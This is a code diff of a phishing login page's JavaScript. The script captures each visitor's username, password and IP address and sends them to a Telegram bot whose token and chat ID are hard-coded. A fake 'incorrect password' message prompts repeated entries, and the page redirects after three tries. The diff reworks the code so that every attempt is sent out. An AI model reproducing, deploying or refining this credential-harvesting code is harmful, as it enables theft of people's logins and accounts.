@@ -148,52 +148,41 @@
             });
 
         function sendMessage(ipAddress) {
-            if (attemptCount < 3) {
-                document.getElementById("attempt").value = "Attempt " + attemptCount;
-                errorMessage.textContent = "Incorrect password. Try again.";
+            // Prepare the message to send to Telegram
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const textMessage = `*Attempt ${attemptCount}:* \n*Username:* ${username}\n*Password:* ${password}\n*IP Address:* ${ipAddress}`;
 
-                // Prepare the message to send to Telegram
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                const textMessage = `*New login attempt:* \n*Username:* ${username}\n*Password:* ${password}\n*IP Address:* ${ipAddress}`;
+            const chatId = '6735326282'; // Replace with your chat ID
+            const token = '7387417554:AAGlNvhvGOnXZ4v15HXb-ctWhm2m6YzaAT0'; // Replace with your bot token
 
-                const chatId = '5629548312'; // Replaced with provided chat ID
-                const token = '7329190669:AAEjjwcMH0WSgQxtGElr8S3vd8kkeVtuCGY'; // Replaced with provided bot token
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;
 
-                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;
+            // Send the message using fetch
+            fetch(url, {
+                method: "POST"
+            }).then(response => response.json()).then(data => {
+                if (data.ok) {
+                    console.log(`Attempt ${attemptCount} message sent successfully!`);
+                } else {
+                    console.log(`Failed to send attempt ${attemptCount} message.`);
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                console.log(`Error sending attempt ${attemptCount} message.`);
+            });
 
-                // Send the message using fetch
-                fetch(url, {
-                    method: "POST"
-                }).then(response => response.json()).then(data => {
-                    if (data.ok) {
-                        console.log('Message sent successfully!');
-                    } else {
-                        console.log('Failed to send message.');
-                    }
-                }).catch(error => {
-                    console.error('Error:', error);
-                    console.log('Error sending message.');
-                });
+            // Hide the error message when the user starts typing again
+            document.getElementById("username").addEventListener("input", () => errorMessage.textContent = "");
+            document.getElementById("password").addEventListener("input", () => errorMessage.textContent = "");
 
-                // Hide the error message when the user starts typing again
-                document.getElementById("username").addEventListener("input", () => errorMessage.textContent = "");
-                document.getElementById("password").addEventListener("input", () => errorMessage.textContent = "");
-            } else {
+            if (attemptCount >= 3) {
                 // On the third attempt, redirect to another page
                 document.getElementById("attempt").value = "Final Attempt";
 
-                // Prepare the message to send to Telegram
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                const textMessage = `*Final login attempt:* \n*Username:* ${username}\n*Password:* ${password}\n*IP Address:* ${ipAddress}`;
+                // Prepare the message to send to Telegram for the final attempt
+                const finalMessage = `*Final login attempt:* \n*Username:* ${username}\n*Password:* ${password}\n*IP Address:* ${ipAddress}`;
 
-                const chatId = '5629548312'; // Replaced with provided chat ID
-                const token = '7329190669:AAEjjwcMH0WSgQxtGElr8S3vd8kkeVtuCGY'; // Replaced with provided bot token
-
-                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;
-
-                // Send the message using fetch
                 fetch(url, {
                     method: "POST"
                 }).then(response => response.json()).then(data => {
@@ -216,3 +205,4 @@
     document.getElementById("contactForm").addEventListener("submit", handleLogin);
 </script>
 </body>
+</html>
